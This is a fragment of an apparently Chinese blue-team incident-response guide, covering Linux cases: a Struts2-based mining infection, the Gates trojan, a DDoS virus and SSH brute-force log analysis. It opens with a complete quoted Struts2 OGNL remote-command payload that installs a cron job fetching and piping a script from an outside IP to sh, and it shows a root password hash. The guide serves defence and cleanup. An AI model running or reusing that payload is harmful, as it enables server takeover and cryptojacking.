{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo \"*/20 * * * * wget -O - -q http://5.188.87.11/icons/logo.jpg|sh\\n*/19 * * * * curl http://5.188.87.11/icons/logo.jpg|sh\" | crontab -;wget -O - -q http://5.188.87.11/icons/logo.jpg|sh').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} \u53ef\u4ee5\u53d1\u73b0\u653b\u51fb\u4ee3\u7801\u4e2d\u7684\u64cd\u4f5c\u4e0e\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5f02\u5e38\u811a\u672c\u4e00\u81f4\uff0c\u636e\u6b64\u63a8\u65ad\u9ed1\u5ba2\u901a\u8fc7Struct \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5411\u670d\u52a1\u5668\u5b9a\u65f6\u4efb\u52a1\u4e2d\u5199\u5165\u6076\u610f\u811a\u672c\u5e76\u6267\u884c\u3002 C\u3001\u6e05\u9664\u75c5\u6bd2 \u00b6 1\u3001\u5220\u9664\u5b9a\u65f6\u4efb\u52a1: 2\u3001\u7ec8\u6b62\u5f02\u5e38\u8fdb\u7a0b: D\u3001\u6f0f\u6d1e\u4fee\u590d \u00b6 \u5347\u7ea7struts\u5230\u6700\u65b0\u7248\u672c 0x03 \u9632\u8303\u63aa\u65bd \u00b6 \u9488\u5bf9\u670d\u52a1\u5668\u88ab\u611f\u67d3\u6316\u77ff\u7a0b\u5e8f\u7684\u73b0\u8c61\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u9884\u9632\u63aa\u65bd\uff1a 1\u3001\u5b89\u88c5\u5b89\u5168\u8f6f\u4ef6\u5e76\u5347\u7ea7\u75c5\u6bd2\u5e93\uff0c\u5b9a\u671f\u5168\u76d8\u626b\u63cf\uff0c\u4fdd\u6301\u5b9e\u65f6\u9632\u62a4 2\u3001\u53ca\u65f6\u66f4\u65b0 Windows\u5b89\u5168\u8865\u4e01\uff0c\u5f00\u542f\u9632\u706b\u5899\u4e34\u65f6\u5173\u95ed\u7aef\u53e3 3\u3001\u53ca\u65f6\u66f4\u65b0web\u6f0f\u6d1e\u8865\u4e01\uff0c\u5347\u7ea7web\u7ec4\u4ef6 \u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c \u00b6 0x00 \u524d\u8a00 \u00b6 Linux\u76d6\u8328\u6728\u9a6c\u662f\u4e00\u7c7b\u6709\u7740\u4e30\u5bcc\u5386\u53f2\uff0c\u9690\u85cf\u624b\u6cd5\u5de7\u5999\uff0c\u7f51\u7edc\u653b\u51fb\u884c\u4e3a\u663e\u8457\u7684DDoS\u6728\u9a6c\uff0c\u4e3b\u8981\u6076\u610f\u7279\u70b9\u662f\u5177\u5907\u4e86\u540e\u95e8\u7a0b\u5e8f\uff0cDDoS\u653b\u51fb\u7684\u80fd\u529b\uff0c\u5e76\u4e14\u4f1a\u66ff\u6362\u5e38\u7528\u7684\u7cfb\u7edf\u6587\u4ef6\u8fdb\u884c\u4f2a\u88c5\u3002\u6728\u9a6c\u5f97\u540d\u4e8e\u5176\u5728\u53d8\u91cf\u51fd\u6570\u7684\u547d\u540d\u4e2d\uff0c\u5927\u91cf\u4f7f\u7528Gates\u8fd9\u4e2a\u5355\u8bcd\u3002\u5206\u6790\u548c\u6e05\u9664\u76d6\u8328\u6728\u9a6c\u7684\u8fc7\u7a0b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6709\u5f88\u591a\u503c\u5f97\u53bb\u5b66\u4e60\u548c\u501f\u9274\u7684\u5730\u65b9\u3002 0x01 \u5e94\u6025\u573a\u666f \u00b6 \u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u53d1\u73b0\u670d\u52a1\u5668CPU\u8d44\u6e90\u5f02\u5e38\uff0c\u51e0\u4e2a\u5f02\u5e38\u8fdb\u7a0b\u5360\u7528\u5927\u91cf\u7f51\u7edc\u5e26\u5bbd\uff1a 0x02 \u4e8b\u4ef6\u5206\u6790 \u00b6 \u5f02\u5e38IP\u8fde\u63a5\uff1a \u5f02\u5e38\u8fdb\u7a0b\uff1a \u67e5\u770b\u8fdb\u884c\u53d1\u73b0ps aux\u8fdb\u7a0b\u5f02\u5e38\uff0c\u8fdb\u5165\u8be5\u76ee\u5f55\u53d1\u73b0\u591a\u4e2a\u547d\u4ee4\uff0c\u731c\u6d4b\u547d\u4ee4\u53ef\u80fd\u5df2\u88ab\u66ff\u6362 \u767b\u5f55\u670d\u52a1\u5668\uff0c\u67e5\u770b\u7cfb\u7edf\u8fdb\u7a0b\u72b6\u6001\uff0c\u53d1\u73b0\u4e0d\u89c4\u5219\u547d\u540d\u7684\u5f02\u5e38\u8fdb\u7a0b\u3001\u5f02\u5e38\u4e0b\u8f7d\u8fdb\u7a0b : \u5f02\u5e38\u542f\u52a8\u9879 \u8fdb\u5165rc3.d\u76ee\u5f55\u53ef\u4ee5\u53d1\u73b0\u591a\u4e2a\u5f02\u5e38\u8fdb\u884c\uff1a /etc/rc.d/rc3.d/S97DbSecuritySpt /etc/rc.d/rc3.d/S99selinux \u641c\u7d22\u75c5\u6bd2\u539f\u4f53 find / -size -1223124c -size +1223122c -exec ls -id {} \\; \u641c\u7d221223123\u5927\u5c0f\u7684\u6587\u4ef6 \u4ece\u4ee5\u4e0a\u79cd\u79cd\u884c\u4e3a\u53d1\u73b0\u8be5\u75c5\u6bd2\u4e0e\u201c\u76d6\u8328\u6728\u9a6c\u201d\u6709\u70b9\u7c7b\u4f3c\uff0c\u5177\u4f53\u6280\u672f\u5206\u6790\u7ec6\u8282\u8be6\u89c1\uff1a Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.freebuf.com/articles/system/117823.html \u60ac\u955c\u670d\u52a1\u5668\u536b\u58eb\u4e28Linux\u5e73\u53f0\u201c\u76d6\u8328\u6728\u9a6c\u201d\u5206\u6790 http://www.sohu.com/a/117926079_515168 \u624b\u52a8\u6e05\u9664\u6728\u9a6c\u8fc7\u7a0b\uff1a 1\u3001\u7b80\u5355\u5224\u65ad\u6709\u65e0\u6728\u9a6c #\u6709\u65e0\u4e0b\u5217\u6587\u4ef6 cat /etc/rc.d/init.d/selinux cat /etc/rc.d/init.d/DbSecuritySpt ls /usr/bin/bsd-port ls /usr/bin/dpkgd #\u67e5\u770b\u5927\u5c0f\u662f\u5426\u6b63\u5e38 ls -lh /bin/netstat ls -lh /bin/ps ls -lh /usr/sbin/lsof ls -lh /usr/sbin/ss 2\u3001\u4e0a\u4f20\u5982\u4e0b\u547d\u4ee4\u5230/root\u4e0b ps netstat ss lsof 3\u3001\u5220\u9664\u5982\u4e0b\u76ee\u5f55\u53ca\u6587\u4ef6 rm -rf /usr/bin/dpkgd (ps netstat lsof ss) rm -rf /usr/bin/bsd-port #\u6728\u9a6c\u7a0b\u5e8f rm -f /usr/bin/.sshd #\u6728\u9a6c\u540e\u95e8 rm -f /tmp/gates.lod rm -f /tmp/moni.lod rm -f /etc/rc.d/init.d/DbSecuritySpt(\u542f\u52a8\u4e0a\u8ff0\u63cf\u8ff0\u7684\u90a3\u4e9b\u6728\u9a6c\u53d8\u79cd\u7a0b\u5e8f) rm -f /etc/rc.d/rc1.d/S97DbSecuritySpt rm -f /etc/rc.d/rc2.d/S97DbSecuritySpt rm -f /etc/rc.d/rc3.d/S97DbSecuritySpt rm -f /etc/rc.d/rc4.d/S97DbSecuritySpt rm -f /etc/rc.d/rc5.d/S97DbSecuritySpt rm -f /etc/rc.d/init.d/selinux(\u9ed8\u8ba4\u662f\u542f\u52a8/usr/bin/bsd-port/getty) rm -f /etc/rc.d/rc1.d/S99selinux rm -f /etc/rc.d/rc2.d/S99selinux rm -f /etc/rc.d/rc3.d/S99selinux rm -f /etc/rc.d/rc4.d/S99selinux rm -f /etc/rc.d/rc5.d/S99selinux 4\u3001\u627e\u51fa\u5f02\u5e38\u7a0b\u5e8f\u5e76\u6740\u6b7b 5\u3001\u5220\u9664\u542b\u6728\u9a6c\u547d\u4ee4\u5e76\u91cd\u65b0\u5b89\u88c5 0x03 \u547d\u4ee4\u66ff\u6362 \u00b6 RPM check\u68c0\u67e5\uff1a \u7cfb\u7edf\u5b8c\u6574\u6027\u4e5f\u53ef\u4ee5\u901a\u8fc7rpm\u81ea\u5e26\u7684-Va\u6765\u6821\u9a8c\u68c0\u67e5\u6240\u6709\u7684rpm\u8f6f\u4ef6\u5305,\u6709\u54ea\u4e9b\u88ab\u7be1\u6539\u4e86,\u9632\u6b62rpm\u4e5f\u88ab\u66ff\u6362,\u4e0a\u4f20\u4e00\u4e2a\u5b89\u5168\u5e72\u51c0\u7a33\u5b9a\u7248\u672crpm\u4e8c\u8fdb\u5236\u5230\u670d\u52a1\u5668\u4e0a\u8fdb\u884c\u68c0\u67e5 ./rpm -Va > rpm.log \u5982\u679c\u4e00\u5207\u5747\u6821\u9a8c\u6b63\u5e38\u5c06\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u8f93\u51fa\u3002\u5982\u679c\u6709\u4e0d\u4e00\u81f4\u7684\u5730\u65b9\uff0c\u5c31\u4f1a\u663e\u793a\u51fa\u6765\u3002\u8f93\u51fa\u683c\u5f0f\u662f8\u4f4d\u957f\u5b57\u7b26\u4e32, ``c \u7528\u4ee5\u6307\u914d\u7f6e\u6587\u4ef6, \u63a5\u7740\u662f\u6587\u4ef6\u540d. 8\u4f4d\u5b57\u7b26\u7684\u6bcf\u4e00\u4e2a \u7528\u4ee5\u8868\u793a\u6587\u4ef6\u4e0eRPM\u6570\u636e\u5e93\u4e2d\u4e00\u79cd\u5c5e\u6027\u7684\u6bd4\u8f83\u7ed3\u679c \u3002``. (\u70b9) \u8868\u793a\u6d4b\u8bd5\u901a\u8fc7\u3002.\u4e0b\u9762\u7684\u5b57\u7b26\u8868\u793a\u5bf9RPM\u8f6f\u4ef6\u5305\u8fdb\u884c\u7684\u67d0\u79cd\u6d4b\u8bd5\u5931\u8d25\uff1a \u547d\u4ee4\u66ff\u6362\uff1a rpm2cpio \u5305\u5168\u540d | cpio -idv .\u6587\u4ef6\u7edd\u5bf9\u8def\u5f84 rpm\u5305\u4e2d\u6587\u4ef6\u63d0\u53d6 Rpm2cpio \u5c06rpm\u5305\u8f6c\u6362\u4e3acpio\u683c\u5f0f\u7684\u547d\u4ee4 Cpio \u662f\u4e00\u4e2a\u6807\u51c6\u5de5\u5177\uff0c\u5b83\u7528\u4e8e\u521b\u5efa\u8f6f\u4ef6\u6863\u6848\u6587\u4ef6\u548c\u4ece\u6863\u6848\u6587\u4ef6\u4e2d\u63d0\u53d6\u6587\u4ef6 Cpio \u9009\u9879 < [\u6587\u4ef6|\u8bbe\u5907] -i\uff1acopy-in\u6a21\u5f0f\uff0c\u8fd8\u539f -d\uff1a\u8fd8\u539f\u65f6\u81ea\u52a8\u65b0\u5efa\u76ee\u5f55 -v\uff1a\u663e\u793a\u8fd8\u539f\u8fc7\u7a0b \u6587\u4ef6\u63d0\u53d6\u8fd8\u539f\u6848\u4f8b\uff1a rpm -qf /bin/ls \u67e5\u8be2ls\u547d\u4ee4\u5c5e\u4e8e\u54ea\u4e2a\u8f6f\u4ef6\u5305 mv /bin/ls /tmp rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls \u63d0\u53d6rpm\u5305\u4e2dls\u547d\u4ee4\u5230\u5f53\u524d\u76ee\u5f55\u7684/bin/ls\u4e0b cp /root/bin/ls /bin/ \u628als\u547d\u4ee4\u590d\u5236\u5230/bin/\u76ee\u5f55 \u4fee\u590d\u6587\u4ef6\u4e22\u5931 \u6302\u8f7d\u547d\u4ee4rpm\u5305\uff1a mkdir /mnt/chrom/ \u5efa\u7acb\u6302\u8f7d\u70b9 mount -t iso9660 /dev/cdrom /mnt/cdrom/ \u6302\u5728\u5149\u76d8 mount/dev/sr0 /mnt/cdrom/ \u5378\u8f7d\u547d\u4ee4 umount \u8bbe\u5907\u6587\u4ef6\u540d\u6216\u6302\u8f7d\u70b9 umount /mnt/cdrom/ \u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2 \u00b6 \u73b0\u8c61\u63cf\u8ff0 \u00b6 \u67d0\u670d\u52a1\u5668\u7f51\u7edc\u8d44\u6e90\u5f02\u5e38,\u611f\u67d3\u8be5\u6728\u9a6c\u75c5\u6bd2\u7684\u670d\u52a1\u5668\u4f1a\u5360\u7528\u7f51\u7edc\u5e26\u5bbd\uff0c\u751a\u81f3\u5f71\u54cd\u7f51\u7edc\u4e1a\u52a1\u6b63\u5e38\u5e94\u7528\u3002 \u7cfb\u7edf\u5206\u6790 \u00b6 \u9488\u5bf9\u65e5\u5fd7\u670d\u52a1\u5668\u75c5\u6bd2\u4e8b\u4ef6\u6392\u67e5\u60c5\u51b5\uff1a \u5728\u5f00\u673a\u542f\u52a8\u9879/etc/rc.d/rc.local\u53d1\u73b0\u53ef\u7591\u7684sh.sh\u811a\u672c\uff0c\u8fdb\u4e00\u6b65\u8ddf\u8e2ash.sh\u811a\u672c,\u8fd9\u662f\u4e00\u4e2a\u68c0\u6d4b\u75c5\u6bd2\u5341\u5206\u949f\u5b58\u6d3b\u7684\u811a\u672c\u3002 \u5728root\u76ee\u5f55\u4e0b\u53d1\u73b0\u5b58\u6d3b\u68c0\u6d4b\u811a\u672c \u89e3\u51b3\u6b65\u9aa4\uff1a \u7ed3\u675f\u8fdb\u7a0b ps aux | grep \"conf.m\" | grep -v grep | awk \u2018{print $2}\u2018| xargs kill -9 \u6e05\u9664\u81ea\u52a8\u542f\u52a8\u811a\u672c vim /etc/rc.local \u53bb\u6389 sh /etc/chongfu.sh & \u6e05\u9664 \u811a\u672c rm -rf /etc/chongfu.sh /tem/chongfu.sh \u4fee\u6539\u767b\u5f55\u5bc6\u7801 passwd \u91cd\u542f\u3002 reboot","title":"Linux\u5b9e\u6218"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#1ssh","text":"","title":"\u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x00","text":"SSH \u662f\u76ee\u524d\u8f83\u53ef\u9760\uff0c\u4e13\u4e3a\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u548c\u5176\u4ed6\u7f51\u7edc\u670d\u52a1\u63d0\u4f9b\u5b89\u5168\u6027\u7684\u534f\u8bae\uff0c\u4e3b\u8981\u7528\u4e8e\u7ed9\u8fdc\u7a0b\u767b\u5f55\u4f1a\u8bdd\u6570\u636e\u8fdb\u884c\u52a0\u5bc6\uff0c\u4fdd\u8bc1\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\u3002SSH\u53e3\u4ee4\u957f\u5ea6\u592a\u77ed\u6216\u8005\u590d\u6742\u5ea6\u4e0d\u591f\uff0c\u5982\u4ec5\u5305\u542b\u6570\u5b57\uff0c\u6216\u4ec5\u5305\u542b\u5b57\u6bcd\u7b49\uff0c\u5bb9\u6613\u88ab\u653b\u51fb\u8005\u7834\u89e3\uff0c\u4e00\u65e6\u88ab\u653b\u51fb\u8005\u83b7\u53d6\uff0c\u53ef\u7528\u6765\u76f4\u63a5\u767b\u5f55\u7cfb\u7edf\uff0c\u63a7\u5236\u670d\u52a1\u5668\u6240\u6709\u6743\u9650\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x01","text":"\u67d0\u5929\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u767b\u5f55\u670d\u52a1\u5668\u8fdb\u884c\u5de1\u68c0\u65f6\uff0c\u53d1\u73b0\u7aef\u53e3\u8fde\u63a5\u91cc\u5b58\u5728\u4e24\u6761\u53ef\u7591\u7684\u8fde\u63a5\u8bb0\u5f55\uff0c\u5982\u4e0b\u56fe\uff1a TCP\u521d\u59cb\u5316\u8fde\u63a5\u4e09\u6b21\u63e1\u624b\u5427\uff1a\u53d1SYN\u5305\uff0c\u7136\u540e\u8fd4\u56deSYN/ACK\u5305\uff0c\u518d\u53d1ACK\u5305\uff0c\u8fde\u63a5\u6b63\u5f0f\u5efa\u7acb\u3002\u4f46\u662f\u8fd9\u91cc\u6709\u70b9\u51fa\u5165\uff0c\u5f53\u8bf7\u6c42\u8005\u6536\u5230SYS/ACK\u5305\u540e\uff0c\u5c31\u5f00\u59cb\u5efa\u7acb\u8fde\u63a5\u4e86\uff0c\u800c\u88ab\u8bf7\u6c42\u8005\u7b2c\u4e09\u6b21\u63e1\u624b\u7ed3\u675f\u540e\u624d\u5efa\u7acb\u8fde\u63a5\u3002 \u5ba2\u6237\u7aefTCP\u72b6\u6001\u8fc1\u79fb\uff1a CLOSED->SYN_SENT->ESTABLISHED->FIN_WAIT_1->FIN_WAIT_2->TIME_WAIT->CLOSED \u670d\u52a1\u5668TCP\u72b6\u6001\u8fc1\u79fb\uff1a 1 CLOSED->LISTEN->SYN recv->ESTABLISHED->CLOSE_WAIT->LAST_ACK->CLOSED \u5f53\u5ba2\u6237\u7aef\u5f00\u59cb\u8fde\u63a5\u65f6\uff0c\u670d\u52a1\u5668\u8fd8\u5904\u4e8eLISTENING\uff0c\u5ba2\u6237\u7aef\u53d1\u4e00\u4e2aSYN\u5305\u540e\uff0c\u670d\u52a1\u7aef\u63a5\u6536\u5230\u4e86\u5ba2\u6237\u7aef\u7684SYN\u5e76\u4e14\u53d1\u9001\u4e86ACK\u65f6\uff0c\u670d\u52a1\u5668\u5904\u4e8eSYN_RECV\u72b6\u6001\uff0c\u7136\u540e\u5e76\u6ca1\u6709\u518d\u6b21\u6536\u5230\u5ba2\u6237\u7aef\u7684ACK\u8fdb\u5165ESTABLISHED\u72b6\u6001\uff0c\u4e00\u76f4\u505c\u7559\u5728SYN_RECV\u72b6\u6001\u3002 \u5728\u8fd9\u91cc\uff0cSSH\uff0822\uff09\u7aef\u53e3\uff0c\u4e24\u6761\u5916\u7f51IP\u7684SYN_RECV\u72b6\u6001\u8fde\u63a5\uff0c\u76f4\u89c9\u544a\u8bc9\u4e86\u7ba1\u7406\u5458\uff0c\u8fd9\u91cc\u4e00\u5b9a\u6709\u4ec0\u4e48\u5f02\u5e38\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x02","text":"SSH\u7aef\u53e3\u5f02\u5e38\uff0c\u6211\u4eec\u9996\u5148\u6709\u5fc5\u8981\u5148\u6765\u4e86\u89e3\u4e00\u4e0b\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5\uff1a A\u3001\u7cfb\u7edf\u8d26\u53f7\u60c5\u51b5 1\u3001\u9664root\u4e4b\u5916\uff0c\u662f\u5426\u8fd8\u6709\u5176\u5b83\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd root 2\u3001\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow root:$6$38cKfZDjsTiUe58V$FP.UHWMObqeUQS1Z2KRj/4EEcOPi.6d1XmKHgK3j3GY9EGvwwBei7nUbbqJC./qK12HN8jFuXOfEYIKLID6hq0::0:99999:7::: \u6211\u4eec\u53ef\u4ee5\u786e\u8ba4\u76ee\u524d\u7cfb\u7edf\u53ea\u6709\u4e00\u4e2a\u7ba1\u7406\u7528\u6237root\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u60f3\u5230\u7684\u662f/var/log/secure\uff0c\u8fd9\u4e2a\u65e5\u5fd7\u6587\u4ef6\u8bb0\u5f55\u4e86\u9a8c\u8bc1\u548c\u6388\u6743\u65b9\u9762\u7684\u4fe1\u606f\uff0c\u53ea\u8981\u6d89\u53ca\u8d26\u53f7\u548c\u5bc6\u7801\u7684\u7a0b\u5e8f\u90fd\u4f1a\u8bb0\u5f55\u4e0b\u6765\u3002 B\u3001\u786e\u8ba4\u653b\u51fb\u60c5\u51b5\uff1a 1\u3001\u7edf\u8ba1\u4e86\u4e0b\u65e5\u5fd7\uff0c\u53d1\u73b0\u5927\u7ea6\u6709126254\u6b21\u767b\u5f55\u5931\u8d25\u7684\u8bb0\u5f55\uff0c\u786e\u8ba4\u670d\u52a1\u5668\u906d\u53d7\u66b4\u529b\u7834\u89e3 [root@localhost ~]# grep -o \"Failed password\" /var/log/secure|uniq -c 126254 Failed password 2\u3001\u8f93\u51fa\u767b\u5f55\u7206\u7834\u7684\u7b2c\u4e00\u884c\u548c\u6700\u540e\u4e00\u884c\uff0c\u786e\u8ba4\u7206\u7834\u65f6\u95f4\u8303\u56f4\uff1a [root@localhost ~]# grep \"Failed password\" /var/log/secure|head -1 Jul 8 20:14:59 localhost sshd[14323]: Failed password for invalid user qwe from 111.13.xxx.xxx port 1503 ssh2 [root@localhost ~]# grep \"Failed password\" /var/log/secure|tail -1 Jul 10 12:37:21 localhost sshd[2654]: Failed password for root from 111.13.xxx.xxx port 13068 ssh2 3\u3001\u8fdb\u4e00\u6b65\u5b9a\u4f4d\u6709\u54ea\u4e9bIP\u5728\u7206\u7834\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|grep -E -o \"(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\"|uniq -c | sort -nr 12622 23.91.xxx.xxx 8942 114.104.xxx.xxx 8122 111.13.xxx.xxx 7525 123.59.xxx.xxx ................... 4\u3001\u7206\u7834\u7528\u6237\u540d\u5b57\u5178\u90fd\u6709\u54ea\u4e9b\uff1f [root@localhost ~]# grep \"Failed password\" /var/log/secure|perl -e 'while($_=<>){ /for(.*?) from/; print \"$1\\n\";}'|uniq -c|sort -nr 9402 root 3265 invalid user oracle 1245 invalid user admin 1025 invalid user user ..................... C\u3001\u7ba1\u7406\u5458\u6700\u8fd1\u767b\u5f55\u60c5\u51b5\uff1a 1\u3001\u767b\u5f55\u6210\u529f\u7684\u65e5\u671f\u3001\u7528\u6237\u540d\u3001IP\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $1,$2,$3,$9,$11}' Jul 9 09:38:09 root 192.168.143.100 Jul 9 14:55:51 root 192.168.143.100 Jul 10 08:54:26 root 192.168.143.100 Jul 10 16:25:59 root 192.168.143.100 ............................ \u901a\u8fc7\u767b\u5f55\u65e5\u5fd7\u5206\u6790\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u65f6\u95f4\u548c\u767b\u5f55IP\u3002 2\u3001\u987a\u4fbf\u7edf\u8ba1\u4e00\u4e0b\u767b\u5f55\u6210\u529f\u7684IP\u6709\u54ea\u4e9b\uff1a [root@localhost ~]# grep \"Accepted \" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more 27 192.168.204.1 \u901a\u8fc7\u65e5\u5fd7\u5206\u6790\uff0c\u53d1\u73b0\u653b\u51fb\u8005\u4f7f\u7528\u4e86\u5927\u91cf\u7684\u7528\u6237\u540d\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u4f46\u4ece\u8fd1\u6bb5\u65f6\u95f4\u7684\u7cfb\u7edf\u7ba1\u7406\u5458\u767b\u5f55\u8bb0\u5f55\u6765\u770b\uff0c\u5e76\u672a\u53d1\u73b0\u5f02\u5e38\u767b\u5f55\u7684\u60c5\u51b5\uff0c\u9700\u8981\u8fdb\u4e00\u6b65\u5bf9\u7f51\u7ad9\u670d\u52a1\u5668\u8fdb\u884c\u5165\u4fb5\u6392\u67e5\uff0c\u8fd9\u91cc\u5c31\u4e0d\u518d\u9610\u8ff0\u3002","title":"0x02 \u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x04","text":"SSH\u66b4\u529b\u7834\u89e3\u4f9d\u7136\u5341\u5206\u666e\u904d\uff0c\u5982\u4f55\u4fdd\u62a4\u670d\u52a1\u5668\u4e0d\u53d7\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff0c\u603b\u7ed3\u4e86\u51e0\u79cd\u63aa\u65bd\uff1a 1\u3001\u7981\u6b62\u5411\u516c\u7f51\u5f00\u653e\u7ba1\u7406\u7aef\u53e3\uff0c\u82e5\u5fc5\u987b\u5f00\u653e\u5e94\u9650\u5b9a\u7ba1\u7406IP\u5730\u5740\u5e76\u52a0\u5f3a\u53e3\u4ee4\u5b89\u5168\u5ba1\u8ba1\uff08\u53e3\u4ee4\u957f\u5ea6\u4e0d\u4f4e\u4e8e8\u4f4d\uff0c\u7531\u6570\u5b57\u3001\u5927\u5c0f\u5199\u5b57\u6bcd\u3001\u7279\u6b8a\u5b57\u7b26\u7b49\u81f3\u5c11\u4e24\u79cd\u4ee5\u4e0a\u7ec4\u5408\u6784\u6210\uff09\u3002 2\u3001\u66f4\u6539\u670d\u52a1\u5668ssh\u9ed8\u8ba4\u7aef\u53e3\u3002 3\u3001\u90e8\u7f72\u5165\u4fb5\u68c0\u6d4b\u8bbe\u5907\uff0c\u589e\u5f3a\u5b89\u5168\u9632\u62a4\u3002","title":"0x04 \u5904\u7406\u63aa\u65bd"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#2","text":"","title":"\u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x00_1","text":"\u77ed\u8fde\u63a5\uff08short connnection\uff09\u662f\u76f8\u5bf9\u4e8e\u957f\u8fde\u63a5\u800c\u8a00\u7684\u6982\u5ff5\uff0c\u6307\u7684\u662f\u5728\u6570\u636e\u4f20\u9001\u8fc7\u7a0b\u4e2d\uff0c\u53ea\u5728\u9700\u8981\u53d1\u9001\u6570\u636e\u65f6\uff0c\u624d\u53bb\u5efa\u7acb\u4e00\u4e2a\u8fde\u63a5\uff0c\u6570\u636e\u53d1\u9001\u5b8c\u6210\u540e\uff0c\u5219\u65ad\u5f00\u6b64\u8fde\u63a5\uff0c\u5373\u6bcf\u6b21\u8fde\u63a5\u53ea\u5b8c\u6210\u4e00\u9879\u4e1a\u52a1\u7684\u53d1\u9001\u3002 \u5728\u7cfb\u7edf\u7ef4\u62a4\u4e2d\uff0c\u4e00\u822c\u5f88\u96be\u53bb\u5bdf\u89c9\uff0c\u9700\u8981\u501f\u52a9\u7f51\u7edc\u5b89\u5168\u8bbe\u5907\u6216\u8005\u6293\u5305\u5206\u6790\uff0c\u624d\u80fd\u591f\u53bb\u53d1\u73b0\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x01_1","text":"\u67d0\u5929\uff0c\u7f51\u7edc\u7ba1\u7406\u5458\u5728\u51fa\u53e3WAF\u68c0\u6d4b\u5230\u67d0\u53f0\u670d\u52a1\u5668\u4e0d\u65ad\u5411\u9999\u6e2fI\u53d1\u8d77\u8bf7\u6c42 \uff0c\u611f\u89c9\u5f88\u5947\u602a\uff0c\u767b\u5f55\u670d\u52a1\u5668\u6392\u67e5\uff0c\u60f3\u8981\u627e\u5230\u53d1\u8d77\u77ed\u8fde\u63a5\u7684\u8fdb\u7a0b\u3002","title":"0x01 \u5e94\u6025\u573a\u666f"},{"location":"blueteam/Linux%E5%AE%9E%E6%88%98/#0x02_1","text":"\u767b\u5f55\u670d\u52a1\u5668\u67e5\u770b\u7aef\u53e3\u3001\u8fdb\u7a0b\uff0c\u5e76\u672a\u53d1\u73b0\u53d1\u73b0\u670d\u52a1\u5668\u5f02\u5e38\uff0c\u4f46\u662f\u5f53\u591a\u6b21\u5237\u65b0\u7aef\u53e3\u8fde\u63a5\u65f6\uff0c\u53ef\u4ee5\u67e5\u770b\u8be5\u8fde\u63a5\u3002 \u6709\u65f6\u5019\u4e00\u76f4\u5237\u8fd9\u6761\u547d\u4ee4\u597d\u5341\u51e0\u6b21\u624d\u4f1a\u51fa\u73b0\uff0c\u50cf\u8fd9\u79cd\u7684\u77ed\u8fde\u63a5\u6781\u96be\u6355\u6349\u5230\u5bf9\u5e94\u7684\u8fdb\u7a0b\u548c\u6e90\u6587\u4ef6\u3002 \u624b\u52a8\u6355\u6349\u4f30\u8ba1\u6ca1\u620f\uff0c\u5f88\u96be\u8ffd\u8e2a\uff0c\u4e8e\u662f\u52a8\u624b\u5199\u4e86\u4e00\u6bb5\u5c0f\u811a\u672c\u6765\u6355\u6349\u77ed\u8fde\u63a5\u5bf9\u5e94\u7684pid\u548c\u6e90\u6587\u4ef6\u3002 \u811a\u672c\u6587\u4ef6\u5982\u4e0b\uff1a #!/bin/bash ip=118.184.15.40 i=1 while : do tmp=netstat -anplt|grep $ip|awk -F '[/]' '{print $1}'|awk '{print 